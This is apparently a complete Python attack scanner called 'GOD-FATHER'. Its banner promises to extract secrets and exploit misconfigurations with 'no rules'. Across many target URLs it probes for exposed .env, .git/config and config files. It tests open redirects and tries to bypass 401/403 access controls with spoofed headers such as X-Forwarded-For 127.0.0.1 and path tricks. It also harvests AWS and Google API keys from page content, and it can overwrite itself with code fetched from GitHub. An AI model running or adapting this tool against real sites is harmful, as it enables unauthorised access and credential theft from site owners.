import requests
import re
import argparse
import urllib3
import os
import sys
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from colorama import Fore, init, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

session = requests.Session()
adapter = requests.adapters.HTTPAdapter(pool_connections=1000, pool_maxsize=1500, max_retries=0)
session.mount('http://', adapter)
session.mount('https://', adapter)

stats = {"ep": 0, "ky": 0, "or": 0, "bp": 0, "sf": 0, "scanned": 0, "total": 0, "live": 0}
seen_secrets = set()
seen_paths = set()
processed_urls = set()
p_lock = threading.Lock()

OR_PAYLOADS = ["https://bing.com", "//bing.com", "/\\/bing.com"]
BYPASS_HEADERS = [
    {'X-Forwarded-For': '127.0.0.1'}, {'X-Forwarded-Host': '127.0.0.1'},
    {'X-Original-URL': '/admin'}, {'X-Rewrite-URL': '/admin'},
    {'X-Remote-IP': '127.0.0.1'}, {'X-Custom-IP-Authorization': '127.0.0.1'}
]

def print_banner():
    b = f"""{Fore.RED}{Style.BRIGHT}
  ▄██████▄   ▄██████▄  ████████▄   ▄████████  ▄██████▄   ██████████  ███    █▄  ████████  ████████▄ 
 ███    ███ ███    ███ ███    ███  ███        ███    ███       ███     ███    ███ ███       ███   ▀███
 ███    █▀  ███    ███ ███    ███  ███        ███    ███       ███     ███    ███ ███       ███    ███
 ███        ███    ███ ███    ███ ▄███▄▄▄     ███▄▄▄▄███       ███     ███▄▄▄▄███ ███▄▄▄     ████████▀ 
 ███    ███ ███    ███ ███    ███ ▀███▀▀▀     ███▀▀▀▀███       ███     ███▀▀▀▀███ ███▀▀▀     ███  ▀███ 
 ███    ██  ███    ███ ███    ███  ███        ███    ███       ███     ███    ███ ███       ███    ███
 ████████▀   ▀██████▀  ████████▀   ███        ███    █▀        ███     ███    █▀  ████████  ███    █▀  

{Fore.RED}══════════════════════════════════════════════════════════════════════════════════════════════════
{Fore.RED}{Style.BRIGHT}   [!] SENSITIVE DATA CAN HIDE, BUT IT CAN'T ESCAPE THE FATHER.
{Fore.RED}══════════════════════════════════════════════════════════════════════════════════════════════════

{Fore.RED}   {Fore.WHITE}»{Fore.RED} SECRETS WILL BE EXTRACTED            {Fore.WHITE}AUTHOR   :{Fore.RED} DHARMVEER
{Fore.RED}   {Fore.WHITE}»{Fore.RED} MISCONFIGURATIONS WILL BE EXPLOITED {Fore.WHITE}VERSION :{Fore.RED} GOD-FATHER v17.0
{Fore.RED}   {Fore.WHITE}»{Fore.RED} SILENCE WILL NOT SAVE YOU            {Fore.WHITE}MODE     :{Fore.RED} NO RULES • NO MERCY

{Fore.RED}────────────────────────────────────────
{Fore.RED}   STATUS : {Fore.GREEN}ACTIVE HUNTING {Fore.RED}──► {Fore.WHITE}TARGETS WILL BLEED DATA
{Fore.RED}══════════════════════════════════════════════════════════════════════════════════════════════════
{Style.RESET_ALL}"""
    print(b)

def update_script():
    repo_url = "https://raw.githubusercontent.com/D-666-V/THE_GOD_FATHER/main/GOD_FATHER.py"
    cache_bypass_url = f"{repo_url}?v={uuid.uuid4().hex}"
    print(f"{Fore.YELLOW}[*] Force fetching latest version from GitHub...")
    headers = {
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'User-Agent': f'Mozilla/5.0 (GF-{uuid.uuid4().hex[:4]})'
    }
    try:
        response = requests.get(cache_bypass_url, headers=headers, timeout=15)
        if response.status_code == 200:
            new_content = response.content
            if len(new_content) > 1000:
                with open(__file__, "wb") as f:
                    f.write(new_content)
                print(f"{Fore.GREEN}[+] Success! Script updated with fresh data.")
                sys.exit(0)
            else:
                print(f"{Fore.RED}[!] Update error: Received file is too small.")
        else:
            print(f"{Fore.RED}[!] Update failed. Status Code: {response.status_code}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error during update: {e}")
    sys.exit(1)

def update_status():
    with p_lock:
        perc = (stats['scanned'] / stats['total']) * 100 if stats['total'] > 0 else 0
        status_line = f"\r\033[K{Fore.BLUE}[{stats['scanned']}/{stats['total']}] {perc:.1f}% - {Fore.GREEN}Live:{stats['live']} {Fore.CYAN}EP:{stats['ep']} {Fore.RED}KY:{stats['ky']} {Fore.MAGENTA}OR:{stats['or']} {Fore.YELLOW}BP:{stats['bp']} {Fore.GREEN}SF:{stats['sf']}"
        sys.stdout.write(status_line)
        sys.stdout.flush()

def log_result(label, value, source_url, color=Fore.WHITE, is_vuln=False):
    with p_lock:
        if "ENDPOINT" in label or "GOLDMINE-EP" in label: stats["ep"] += 1
        elif "OR" in label: stats["or"] += 1
        elif "BP" in label: stats["bp"] += 1
        elif "SENS-FILE" in label: stats["sf"] += 1
        elif any(k in label for k in ["KEY", "TOKEN"]): stats["ky"] += 1
        sys.stdout.write("\r\033[K")
        if is_vuln:
            output = f"{Fore.MAGENTA}!!! [VULNERABLE-{label}] {value} !!!"
        else:
            output = f"{color}[{label}] {value}"
        sys.stdout.write(f"{output}\n")
    update_status()

def save_to_file(output_file, data_type, value, source):
    if not output_file: return
    with open(output_file, 'a', encoding='utf-8') as f:
        f.write(f"[{data_type}] {value} | {source}\n")

def test_or_poc(url, output_file):
    try:
        parsed_url = urlparse(url)
        if not parsed_url.query: return
        params = parse_qs(parsed_url.query)
        target_keys = ['url', 'redirect', 'next', 'dest', 'path', 'uri', 'to', 'out', 'domain', 'host']
        rand_dom = f"gf{uuid.uuid4().hex[:6]}.com"
        payload = f"https://{rand_dom}"
        for key in params:
            if any(tk in key.lower() for tk in target_keys):
                orig_val = params[key]
                params[key] = [payload]
                test_url = urlunparse(parsed_url._replace(query=urlencode(params, doseq=True)))
                try:
                    r = session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    loc = r.headers.get('Location', '')
                    if r.status_code in [301, 302, 303, 307, 308] and rand_dom in loc:
                        log_result("OR", test_url, url, Fore.MAGENTA + Style.BRIGHT, is_vuln=True)
                        save_to_file(output_file, "OPEN-REDIRECT", test_url, url)
                        return
                except: pass
                params[key] = orig_val
    except: pass

def try_bypass(url, output_file):
    try:
        original_r = session.get(url, timeout=4, verify=False, allow_redirects=False)
        orig_status = original_r.status_code
        orig_size = len(original_r.content)
        if orig_status == 200: return False
        f_paths = [url, url + "/%2e/", url + "..;/"] 
        for f_path in f_paths:
            for header in BYPASS_HEADERS:
                try:
                    r = session.get(f_path, headers=header, timeout=4, verify=False, allow_redirects=False)
                    if r.status_code == 200 and len(r.content) != orig_size and len(r.content) > 100:
                        low_content = r.text.lower()
                        if not any(word in low_content for word in ["access denied", "forbidden", "unauthorized"]):
                            log_result("BP-SUCCESS", f"{f_path}", url, Fore.YELLOW + Style.BRIGHT)
                            save_to_file(output_file, "BYPASS-SUCCESS", f_path, f"Header: {list(header.keys())[0]}")
                            return True
                except: pass
    except: pass
    return False

def scan_logic(content, source_url, output_file, args):
    if args.ep or args.all:
        ep_pat = r'["\'](/(?:api|v[0-9]|v3|graphql|admin|auth|config|internal|web-api|rest|hidden|debug|v4)/[a-zA-Z0-9\-_/.]+)["\']|["\'](https?://[a-zA-Z0-9.\-_/]+(?:api|v[0-9]|v3|graphql|internal|debug|v4)[a-zA-Z0-9.\-_/]*)["\']'
        for match in re.findall(ep_pat, content):
            val = match[0] if match[0] else match[1]
            if not val or any(val.lower().endswith(ext) for ext in ('.jpg', '.png', '.css', '.js', '.ico')): continue
            path_sig = re.sub(r'/\d+', '/{ID}', val)
            if path_sig in seen_paths: continue
            seen_paths.add(path_sig)
            is_gold = any(gk in val.lower() for gk in ['admin', 'config', 'internal', 'env', 'secret', 'auth'])
            label = "GOLDMINE-EP" if is_gold else "ENDPOINT"
            log_result(label, val, source_url, Fore.CYAN + Style.BRIGHT if is_gold else Fore.CYAN)
            save_to_file(output_file, label, val, source_url)
    if args.ky or args.all:
        patterns = {"GOOGLE_KEY": r'\bAIza[0-9A-Za-z\-_]{35}\b', "AWS_KEY": r'\b(?:AKIA|ASIA)[0-9A-Z]{16}\b'}
        for label, pat in patterns.items():
            for m in re.findall(pat, content):
                if m not in seen_secrets:
                    log_result(label, m, source_url, Fore.RED + Style.BRIGHT)
                    seen_secrets.add(m)
                    save_to_file(output_file, label, m, source_url)

def process_url(url, args):
    if url in processed_urls: return
    processed_urls.add(url)
    try:
        if args.sf or args.all:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            for sf_p in ['.env', '.git/config', 'phpinfo.php', 'config.json']:
                f_url = f"{base.rstrip('/')}/{sf_p}"
                if f_url in processed_urls: continue
                processed_urls.add(f_url)
                try:
                    sr = session.get(f_url, timeout=4, verify=False, allow_redirects=False)
                    if sr.status_code == 200 and len(sr.content) > 10:
                        log_result("SENS-FILE", f_url, url, Fore.GREEN + Style.BRIGHT)
                        save_to_file(args.output, "SENSITIVE-FILE", f_url, "Hit")
                except: pass
        if args.poc or args.all: test_or_poc(url, args.output)
        r = session.get(url, timeout=5, verify=False, headers={'User-Agent': 'Mozilla/5.0'})
        if r.status_code == 200:
            if args.verify:
                with p_lock: stats["live"] += 1
            scan_logic(r.text, url, args.output, args)
        elif r.status_code in [401, 403] and (args.bp or args.all):
            try_bypass(url, args.output)
    except: pass
    with p_lock: stats["scanned"] += 1
    update_status()

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-i", "--input")
    parser.add_argument("-t", "--threads", type=int, default=150)
    parser.add_argument("-o", "--output", default=None)
    parser.add_argument("-v", "--verify", action="store_true")
    parser.add_argument("-ky", action="store_true")
    parser.add_argument("-ep", action="store_true")
    parser.add_argument("-bp", action="store_true")
    parser.add_argument("-sf", action="store_true")
    parser.add_argument("-poc", action="store_true")
    parser.add_argument("-all", action="store_true")
    parser.add_argument("-up", "--update", action="store_true")
    parser.add_argument("-h", "--help", action="store_true")
    args = parser.parse_args()
    if args.update: update_script()
    print_banner()
    if args.help or not args.input:
        print(f"{Fore.RED}USAGE: python3 GOD_FATHER.py -i <urls.txt> -all")
        sys.exit(0)
    try:
        with open(args.input, 'r') as f:
            urls = list(set(line.strip() for line in f if line.strip()))
        stats["total"] = len(urls)
        update_status()
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            list(executor.map(lambda u: process_url(u, args), urls))
        print(f"\n\n{Fore.GREEN} GOD-FATHER HUNTING COMPLETE")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
